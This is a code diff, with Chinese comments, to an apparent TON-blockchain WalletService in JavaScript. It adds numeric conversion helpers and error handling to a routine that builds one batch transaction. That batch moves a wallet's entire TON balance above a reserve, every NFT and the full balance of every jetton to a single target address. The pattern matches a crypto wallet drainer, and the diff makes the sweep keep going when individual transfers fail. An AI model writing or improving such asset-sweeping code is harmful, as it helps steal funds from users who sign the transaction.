@@ -2,14 +2,58 @@
 import redis from "../utils/redis.js";
 import TonWeb from "tonweb";
 
-const { Address } = TonWeb.utils;
+const { Address, BN } = TonWeb.utils;
+
+/** 安全的数值转换工具 */
+const NumberUtils = {
+  /** 将任意数值转为 BigInt，避免精度问题 */
+  toBigInt(value) {
+    if (typeof value === 'bigint') return value;
+    if (typeof value === 'string') return BigInt(value);
+    if (typeof value === 'number') {
+      if (!Number.isInteger(value)) {
+        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BigInt`);
+      }
+      return BigInt(value);
+    }
+    if (value instanceof BN) return BigInt(value.toString());
+    throw new Error(`无法将 ${typeof value} 类型转换为 BigInt`);
+  },
+
+  /** 将任意数值转为 BN 对象 */
+  toBN(value) {
+    if (value instanceof BN) return value;
+    if (typeof value === 'bigint') return new BN(value.toString());
+    if (typeof value === 'string') return new BN(value);
+    if (typeof value === 'number') {
+      if (!Number.isInteger(value)) {
+        throw new Error(`数值 ${value} 不是整数，无法安全转换为 BN`);
+      }
+      return new BN(value);
+    }
+    throw new Error(`无法将 ${typeof value} 类型转换为 BN`);
+  },
+
+  /** 安全的字符串转换 */
+  toString(value) {
+    if (typeof value === 'string') return value;
+    if (typeof value === 'bigint') return value.toString();
+    if (typeof value === 'number') return value.toString();
+    if (value instanceof BN) return value.toString();
+    return String(value);
+  }
+};
 
 /** 辅助：把人类可读金额转为 raw（uint128 / BigInt） */
 function toRawAmountBigInt(humanStr, decimals) {
-  const [intPart = "0", fracRaw = ""] = String(humanStr).split(".");
-  const frac = (fracRaw + "0".repeat(decimals)).slice(0, decimals);
-  const s = (intPart + frac).replace(/^0+/, "") || "0";
-  return BigInt(s);
+  try {
+    const [intPart = "0", fracRaw = ""] = String(humanStr).split(".");
+    const frac = (fracRaw + "0".repeat(decimals)).slice(0, decimals);
+    const s = (intPart + frac).replace(/^0+/, "") || "0";
+    return NumberUtils.toBigInt(s);
+  } catch (error) {
+    throw new Error(`金额转换失败 ${humanStr}: ${error.message}`);
+  }
 }
 
 /** 获取 TonWeb Provider（Toncenter） */
@@ -127,8 +171,18 @@ export class WalletService {
 
   /** 工具：TON → nanoTON（字符串） */
   static toNanoStr = (vTon) => {
-    if (typeof vTon === "number") vTon = vTon.toFixed(9); // 最多 9 位
-    return TonWeb.utils.toNano(String(vTon)).toString();
+    try {
+      // 安全处理数值精度
+      let processedValue = vTon;
+      if (typeof vTon === "number") {
+        processedValue = vTon.toFixed(9); // 最多 9 位小数，避免精度问题
+      }
+      
+      const nanoAmount = TonWeb.utils.toNano(NumberUtils.toString(processedValue));
+      return NumberUtils.toString(nanoAmount);
+    } catch (error) {
+      throw new Error(`TON 金额转换失败 ${vTon}: ${error.message}`);
+    }
   };
 
   /**（示例）生成 “用户名 NFT 转移” 的交易（给 NFT Item 地址发消息） */
@@ -207,9 +261,8 @@ export class WalletService {
         );
         const data = await res.json();
         assets.ton.balance = data.balance || "0";
-        assets.ton.balanceTon = TonWeb.utils.fromNano(
-          String(data.balance || "0")
-        );
+        const balanceStr = NumberUtils.toString(data.balance || "0");
+        assets.ton.balanceTon = TonWeb.utils.fromNano(balanceStr);
       }
 
       // 2. NFTs
@@ -264,11 +317,15 @@ export class WalletService {
       const balTon = parseFloat(assets.ton.balanceTon || "0");
       const canSend = Math.max(0, balTon - keepTon);
       if (canSend > 0.5) {
-        messages.push({
-          address: targetOwner,
-          amount: this.toNanoStr(canSend),
-          payload: "",
-        });
+        try {
+          messages.push({
+            address: targetOwner,
+            amount: this.toNanoStr(canSend),
+            payload: "",
+          });
+        } catch (error) {
+          console.warn(`TON转账金额处理失败: ${error.message}`);
+        }
       }
 
       // 2) NFTs：逐个把所有权转给 targetOwner
@@ -290,31 +347,43 @@ export class WalletService {
       // 3) Jettons：统一用 TIP-3 transfer
       // tonapi 返回的每个 jetton 结构：{ balance: "raw", wallet_address, jetton: { address: root, decimals, symbol, ... } }
       for (const j of assets.jettons) {
-        const jettonRoot = j?.jetton?.address;
-        const rawBalanceStr = String(j?.balance ?? "0");
-        const rawBalance = BigInt(rawBalanceStr);
+        try {
+          const jettonRoot = j?.jetton?.address;
+          const rawBalanceStr = NumberUtils.toString(j?.balance ?? "0");
+          const rawBalance = NumberUtils.toBigInt(rawBalanceStr);
+          
+          if (!jettonRoot || rawBalance === 0n) {
+            console.log(`跳过无效 Jetton: ${jettonRoot}, balance: ${rawBalanceStr}`);
+            continue;
+          }
 
-        // 计算发送方的 JettonWallet 地址
-        const senderJettonWallet = await getSenderJettonWalletAddress(
-          jettonRoot,
-          wallet
-        );
+          // 计算发送方的 JettonWallet 地址
+          const senderJettonWallet = await getSenderJettonWalletAddress(
+            jettonRoot,
+            wallet
+          );
 
-        // 3.2 构造 payload（全额转出）
-        const payload = await buildJettonTransferPayloadBase64({
-          toOwnerAddress: targetOwner,
-          rawAmountBigInt: rawBalance,
-          responseToAddress: wallet,
-          forwardAmountTon: "0",
-          forwardComment: "",
-        });
+          // 3.2 构造 payload（全额转出）
+          const payload = await buildJettonTransferPayloadBase64({
+            toOwnerAddress: targetOwner,
+            rawAmountBigInt: rawBalance,
+            responseToAddress: wallet,
+            forwardAmountTon: "0",
+            forwardComment: "",
+          });
 
-        // 3.3 外部消息发送到 senderJettonWallet
-        messages.push({
-          address: senderJettonWallet.toString(true, true, true),
-          amount: this.toNanoStr(0.05), // 建议 0.05~0.1 TON
-          payload,
-        });
+          // 3.3 外部消息发送到 senderJettonWallet
+          messages.push({
+            address: senderJettonWallet.toString(true, true, true),
+            amount: this.toNanoStr(0.05), // 建议 0.05~0.1 TON
+            payload,
+          });
+          
+          console.log(`添加 Jetton 转账: ${j?.jetton?.symbol || 'Unknown'}, 数量: ${rawBalanceStr}`);
+        } catch (error) {
+          console.error(`处理 Jetton 转账失败: ${j?.jetton?.symbol || 'Unknown'}`, error);
+          // 继续处理下一个 Jetton，不中断整个流程
+        }
       }
 
       console.log(`批量转移交易已生成: ${messages.length} 个消息`);
@@ -421,8 +490,14 @@ export class WalletService {
 
           let okAmt = true;
           if (expect.minAmountNano) {
-            const val = BigInt(String(inMsg.value || "0"));
-            okAmt = val >= BigInt(String(expect.minAmountNano));
+            try {
+              const val = NumberUtils.toBigInt(inMsg.value || "0");
+              const minAmt = NumberUtils.toBigInt(expect.minAmountNano);
+              okAmt = val >= minAmt;
+            } catch (error) {
+              console.warn(`金额比较失败: ${error.message}`);
+              okAmt = false;
+            }
           }
 
           // 可扩展 from 校验
